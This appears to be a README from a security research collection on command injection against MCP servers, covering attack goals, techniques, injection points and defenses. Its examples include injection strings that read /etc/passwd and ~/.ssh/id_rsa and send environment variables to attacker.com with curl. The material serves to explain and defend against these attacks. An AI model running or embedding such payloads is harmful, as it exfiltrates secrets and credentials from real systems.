# Command Injection Attack

## Attack Overview

Command injection attack is a method that exploits MCP server execution functionality to inject and execute malicious system commands. When MCP servers provide code execution, command execution, or script running features, attackers can construct special inputs to execute arbitrary system commands beyond the originally intended operations.

## Attack Objectives

By injecting malicious commands, achieve the following:
1. **System Information Theft**: Obtain sensitive information such as system environment variables, user directories, network configuration
2. **File System Access**: Read, write, or delete system files
3. **Remote Control**: Establish reverse shell for persistent control
4. **Data Exfiltration**: Send sensitive data to attacker servers
5. **Privilege Escalation**: Exploit system vulnerabilities to elevate execution privileges

## Attack Techniques

### 1. Command Separator Injection
```python
# Original input
user_input = "example.txt"

# After injection
user_input = "example.txt; cat /etc/passwd"
# Or
user_input = "example.txt && curl https://attacker.com/steal -d $(env)"
```

### 2. Command Substitution Injection
```python
# Using backticks or $() for command substitution
user_input = "example.txt `env | base64`"
# Or
user_input = "example.txt $(cat ~/.ssh/id_rsa)"
```

### 3. Pipe Injection
```python
# Send data to external via pipe
user_input = "example.txt | curl -X POST https://attacker.com -d @-"
```

### 4. Code-based Command Injection
```python
# Original code
def execute_code(code):
    exec(code)

# Malicious input
code = """
import os
os.system('curl -X POST https://attacker.com/steal -d $(env)')
"""
```

## Attack Characteristics

- **Direct Execution**: Malicious commands execute immediately on the target system
- **High Impact**: Can gain system-level access
- **Stealth**: Can disguise as normal input parameters
- **Persistence**: Can implant backdoors for long-term control

## Common Injection Points

1. **File Path Parameters**: File names, directory paths
2. **Code Execution Parameters**: Python code, shell scripts
3. **URL Parameters**: Download links, API endpoints
4. **Configuration Parameters**: Configuration file paths, environment variables

## Detection Challenges

- Malicious commands mixed with normal parameters
- Using encoding and obfuscation techniques
- Exploiting legitimate system functions
- Injection through input without modifying server code

## Defense Recommendations

1. **Input Validation**: Strictly validate and filter user input
2. **Parameterized Commands**: Use parameter lists instead of string concatenation
3. **Sandbox Environment**: Execute commands in isolated environments
4. **Least Privilege**: Run servers with minimal privileges
5. **Command Whitelist**: Only allow predefined commands to execute

## Attack Cases

This directory contains 2 real attack implementation cases:
1. zhkzly_mcp_leanring - Command injection in Blender code execution
2. stat-guy_terminal - Command injection in terminal command execution

Each case contains complete attack code and detailed documentation.